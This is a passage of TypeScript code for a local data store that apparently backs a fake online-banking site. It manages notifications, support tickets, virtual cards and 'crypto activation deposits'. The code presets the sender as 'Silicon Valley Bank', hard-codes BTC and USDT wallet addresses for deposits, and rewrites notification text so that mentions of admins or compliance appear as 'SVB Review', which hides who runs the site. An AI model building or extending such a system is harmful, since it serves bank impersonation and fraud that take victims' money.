        .replace(/SVB Compliance/gi, 'SVB Review')
        .replace(/SVB Administration/gi, 'SVB Review')
        .replace(/system administrator/gi, 'SVB Review team')
        .replace(/administrator/gi, 'SVB Review')
        .replace(/by Compliance/gi, 'by SVB Review')
        .replace(/by Admin/gi, 'by SVB Review')
        .replace(/\bAdmin\b/g, 'SVB Review')
        .replace(/\badmin\b/g, 'SVB Review');
    };
    return this.db.notifications
      .filter(n => n.userId === userId)
      .map(n => ({
        ...n,
        title: cleanStr(n.title),
        message: cleanStr(n.message)
      }));
  }

  addNotification(notif: UserNotification): void {
    this.refresh();
    const cleanStr = (s: string) => {
      if (!s) return '';
      return s
        .replace(/Compliance Admin/gi, 'SVB Review')
        .replace(/Compliance team/gi, 'SVB Review team')
        .replace(/Bank Compliance/gi, 'SVB Review')
        .replace(/SVB Compliance/gi, 'SVB Review')
        .replace(/SVB Administration/gi, 'SVB Review')
        .replace(/system administrator/gi, 'SVB Review team')
        .replace(/administrator/gi, 'SVB Review')
        .replace(/by Compliance/gi, 'by SVB Review')
        .replace(/by Admin/gi, 'by SVB Review')
        .replace(/\bAdmin\b/g, 'SVB Review')
        .replace(/\badmin\b/g, 'SVB Review');
    };
    const cleaned = {
      ...notif,
      title: cleanStr(notif.title),
      message: cleanStr(notif.message)
    };
    this.db.notifications.unshift(cleaned);
    this.persist();
  }

  markNotificationsRead(userId: string): void {
    this.refresh();
    this.db.notifications.forEach(n => {
      if (n.userId === userId) n.read = true;
    });
    this.persist();
  }

  // Support Tickets
  getSupportTickets(userIdentifier?: { id?: string; email?: string } | string, isAdmin?: boolean): SupportTicket[] {
    this.refresh();
    const enrich = (t: SupportTicket): SupportTicket => {
      const user = this.db.users.find(u => 
        (t.userId && u.id === t.userId) || 
        (t.userEmail && u.email && u.email.toLowerCase() === t.userEmail.toLowerCase()) ||
        (t.accountNumber && u.accountNumber === t.accountNumber) ||
        (t.userName && u.fullName && u.fullName.toLowerCase() === t.userName.toLowerCase())
      );
      const messages = Array.isArray(t.messages) ? t.messages : [];
      const canonicalId = (t.id || '').startsWith('TICKET-') ? t.id : `TICKET-${t.id || Date.now()}`;
      return {
        ...t,
        id: canonicalId,
        chatId: canonicalId,
        threadId: canonicalId,
        roomId: canonicalId,
        userName: user?.fullName || t.userName || 'Client',
        userEmail: user?.email || t.userEmail || '',
        accountNumber: user?.accountNumber || t.accountNumber || '',
        messages
      };
    };

    const all = this.db.supportTickets.map(enrich);
    
    // Deduplicate by canonical ID
    const dedupMap = new Map<string, SupportTicket>();
    all.forEach(t => {
      const canon = t.id;
      const ex = dedupMap.get(canon);
      if (!ex) {
        dedupMap.set(canon, t);
      } else {
        const msgMap = new Map<string, any>();
        (ex.messages || []).forEach(m => {
          if (m) msgMap.set(m.id || `${m.senderId}_${(m.message || '').trim()}_${m.createdAt}`, m);
        });
        (t.messages || []).forEach(m => {
          if (m) msgMap.set(m.id || `${m.senderId}_${(m.message || '').trim()}_${m.createdAt}`, m);
        });
        const mergedMsgs = Array.from(msgMap.values()).sort(
          (a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()
        );
        const isTNewer = new Date(t.updatedAt || t.createdAt || 0).getTime() >= new Date(ex.updatedAt || ex.createdAt || 0).getTime();
        dedupMap.set(canon, {
          ...ex,
          ...t,
          id: canon,
          chatId: canon,
          threadId: canon,
          roomId: canon,
          status: isTNewer ? t.status : ex.status,
          messages: mergedMsgs,
          updatedAt: isTNewer ? (t.updatedAt || new Date().toISOString()) : ex.updatedAt
        });
      }
    });

    const dedupedList = Array.from(dedupMap.values());

    if (isAdmin) {
      return dedupedList.sort((a, b) => new Date(b.updatedAt || b.createdAt).getTime() - new Date(a.updatedAt || a.createdAt).getTime());
    }

    const targetId = typeof userIdentifier === 'string' ? userIdentifier.trim().toLowerCase() : (userIdentifier?.id || '').trim().toLowerCase();
    const targetEmail = typeof userIdentifier === 'string' ? (userIdentifier.includes('@') ? userIdentifier.trim().toLowerCase() : '') : (userIdentifier?.email || '').trim().toLowerCase();

    return dedupedList
      .filter(t => {
        if (!userIdentifier) return true;
        const ticketUid = (t.userId || '').trim().toLowerCase();
        const ticketEmail = (t.userEmail || '').trim().toLowerCase();
        if (targetId && ticketUid === targetId) return true;
        if (targetEmail && ticketEmail === targetEmail) return true;
        if (targetId && ticketEmail === targetId) return true;
        if (targetEmail && ticketUid === targetEmail) return true;
        return false;
      })
      .sort((a, b) => new Date(b.updatedAt || b.createdAt).getTime() - new Date(a.updatedAt || a.createdAt).getTime());
  }

  addSupportTicket(ticket: SupportTicket): SupportTicket {
    this.refresh();
    const user = this.db.users.find(u => 
      (ticket.userId && u.id === ticket.userId) || 
      (ticket.userEmail && u.email && u.email.toLowerCase() === ticket.userEmail.toLowerCase()) ||
      (ticket.accountNumber && u.accountNumber === ticket.accountNumber) ||
      (ticket.userName && u.fullName && u.fullName.toLowerCase() === ticket.userName.toLowerCase())
    );

    const canonicalId = (ticket.id || '').startsWith('TICKET-') ? ticket.id : `TICKET-${ticket.id || Date.now()}`;
    const cleanId = canonicalId.replace(/^TICKET-/, '').trim().toLowerCase();

    const idx = this.db.supportTickets.findIndex(t => {
      const tId = (t.id || '').replace(/^TICKET-/, '').trim().toLowerCase();
      const cId = (t.chatId || '').replace(/^TICKET-/, '').trim().toLowerCase();
      return tId === cleanId || cId === cleanId;
    });

    let finalMessages = Array.isArray(ticket.messages) ? [...ticket.messages] : [];

    if (idx >= 0) {
      const existing = this.db.supportTickets[idx];
      const msgMap = new Map<string, any>();
      (existing.messages || []).forEach(m => {
        if (m) msgMap.set(m.id || `${m.senderId}_${(m.message || '').trim()}_${m.createdAt}`, m);
      });
      finalMessages.forEach(m => {
        if (m) msgMap.set(m.id || `${m.senderId}_${(m.message || '').trim()}_${m.createdAt}`, m);
      });
      finalMessages = Array.from(msgMap.values()).sort(
        (a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()
      );

      const mergedTicket: SupportTicket = {
        ...existing,
        ...ticket,
        id: canonicalId,
        chatId: canonicalId,
        threadId: canonicalId,
        roomId: canonicalId,
        userName: user?.fullName || ticket.userName || existing.userName || 'Client',
        userEmail: user?.email || ticket.userEmail || existing.userEmail || '',
        accountNumber: user?.accountNumber || ticket.accountNumber || existing.accountNumber || '',
        messages: finalMessages,
        updatedAt: ticket.updatedAt || new Date().toISOString()
      };
      this.db.supportTickets[idx] = mergedTicket;
      this.persist();
      return mergedTicket;
    } else {
      const newTicket: SupportTicket = {
        ...ticket,
        id: canonicalId,
        chatId: canonicalId,
        threadId: canonicalId,
        roomId: canonicalId,
        userName: user?.fullName || ticket.userName || 'Client',
        userEmail: user?.email || ticket.userEmail || '',
        accountNumber: user?.accountNumber || ticket.accountNumber || '',
        messages: finalMessages,
        createdAt: ticket.createdAt || new Date().toISOString(),
        updatedAt: ticket.updatedAt || new Date().toISOString()
      };
      this.db.supportTickets.unshift(newTicket);
      this.persist();
      return newTicket;
    }
  }

  updateSupportTicket(ticket: SupportTicket): SupportTicket {
    return this.addSupportTicket(ticket);
  }

  deleteSupportMessage(ticketId: string, messageId: string): SupportTicket | null {
    this.refresh();
    const cleanTId = (ticketId || '').replace(/^TICKET-/, '').trim().toLowerCase();
    const idx = this.db.supportTickets.findIndex(t => {
      const tId = (t.id || '').replace(/^TICKET-/, '').trim().toLowerCase();
      const cId = (t.chatId || '').replace(/^TICKET-/, '').trim().toLowerCase();
      return tId === cleanTId || cId === cleanTId;
    });

    if (idx >= 0) {
      const ticket = this.db.supportTickets[idx];
      const filteredMessages = (ticket.messages || []).filter(m => {
        if (!m) return false;
        if (m.id === messageId) return false;
        const msgKey = `${m.senderId}_${(m.message || '').trim()}_${m.createdAt}`;
        if (msgKey === messageId || `${m.senderId}-${m.message}-${m.createdAt}` === messageId) return false;
        return true;
      });

      const updatedTicket: SupportTicket = {
        ...ticket,
        messages: filteredMessages,
        updatedAt: new Date().toISOString()
      };
      this.db.supportTickets[idx] = updatedTicket;
      this.persist();
      return updatedTicket;
    }
    return null;
  }

  // Virtual Cards
  getVirtualCards(userId: string): VirtualCard[] {
    this.refresh();
    return this.db.virtualCards.filter(c => c.userId === userId);
  }

  addVirtualCard(card: VirtualCard): VirtualCard {
    this.refresh();
    const idx = this.db.virtualCards.findIndex(c => c.id === card.id);
    if (idx >= 0) {
      this.db.virtualCards[idx] = card;
    } else {
      this.db.virtualCards.unshift(card);
    }
    this.persist();
    return card;
  }

  // Bill Payments
  getBillPayments(userId: string): BillPayment[] {
    this.refresh();
    return this.db.billPayments.filter(b => b.userId === userId);
  }

  addBillPayment(bill: BillPayment): BillPayment {
    this.refresh();
    this.db.billPayments.unshift(bill);
    this.persist();
    return bill;
  }

  // Crypto Activation Deposits
  getCryptoDeposits(): CryptoActivationDeposit[] {
    this.refresh();
    return this.db.cryptoDeposits;
  }

  addCryptoDeposit(dep: CryptoActivationDeposit): CryptoActivationDeposit {
    this.refresh();
    this.db.cryptoDeposits.unshift(dep);
    this.persist();
    return dep;
  }

  updateCryptoDeposit(id: string, updates: Partial<CryptoActivationDeposit>): void {
    this.refresh();
    const idx = this.db.cryptoDeposits.findIndex(d => d.id === id);
    if (idx >= 0) {
      this.db.cryptoDeposits[idx] = { ...this.db.cryptoDeposits[idx], ...updates };
      this.persist();
    }
  }

  // Verifications
  getVerifications(): Tier3VerificationRequest[] {
    this.refresh();
    return this.db.verifications;
  }

  addVerification(req: Tier3VerificationRequest): Tier3VerificationRequest {
    this.refresh();
    this.db.verifications.unshift(req);
    this.persist();
    return req;
  }

  updateVerification(id: string, updates: Partial<Tier3VerificationRequest>): void {
    this.refresh();
    const idx = this.db.verifications.findIndex(v => v.id === id);
    if (idx >= 0) {
      this.db.verifications[idx] = { ...this.db.verifications[idx], ...updates };
      this.persist();
    }
  }

  // Audit Logs
  getAuditLogs(): AuditLog[] {
    this.refresh();
    return this.db.auditLogs;
  }

  addAuditLog(log: AuditLog): void {
    this.refresh();
    this.db.auditLogs.unshift(log);
    this.persist();
  }

  // Crypto Addresses
  getCryptoAddresses() {
    this.refresh();
    if (!this.db.cryptoAddresses) {
      this.db.cryptoAddresses = {
        BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
        USDT: '0x400773d018e8ad3575458b5e8b11ff55078451c9'
      };
      this.persist();
    }
    return this.db.cryptoAddresses;
  }

  updateCryptoAddresses(addresses: { BTC?: string; USDT?: string }) {
    this.refresh();
    const current = this.getCryptoAddresses();
    if (addresses.BTC) current.BTC = addresses.BTC;
    if (addresses.USDT) current.USDT = addresses.USDT;
    this.db.cryptoAddresses = current;
    this.persist();
    return current;
  }

  // Email Configuration & Delivery Logs
  getEmailConfig(): EmailConfig {
    this.refresh();
    if (!this.db.emailConfig) {
      this.db.emailConfig = {
        provider: 'auto',
        senderEmail: 'notifications@svb.com',
        senderName: 'Silicon Valley Bank',
        updatedAt: new Date().toISOString()
      };
      this.persist();
    }
    return this.db.emailConfig;
  }

  saveEmailConfig(config: Partial<EmailConfig>): EmailConfig {
    this.refresh();
    const current = this.getEmailConfig();
    this.db.emailConfig = {
      ...current,
      ...config,
      updatedAt: new Date().toISOString()
    };
    this.persist();
    return this.db.emailConfig;
  }

  getEmailLogs(): any[] {
    this.refresh();
    return this.db.emailLogs || [];
  }

  addEmailLog(log: any): void {
    this.refresh();
    if (!this.db.emailLogs) this.db.emailLogs = [];
    this.db.emailLogs.unshift(log);
    if (this.db.emailLogs.length > 100) {
      this.db.emailLogs = this.db.emailLogs.slice(0, 100);
    }
    this.persist();
  }
}

export const dbStore = new LocalDBStore();
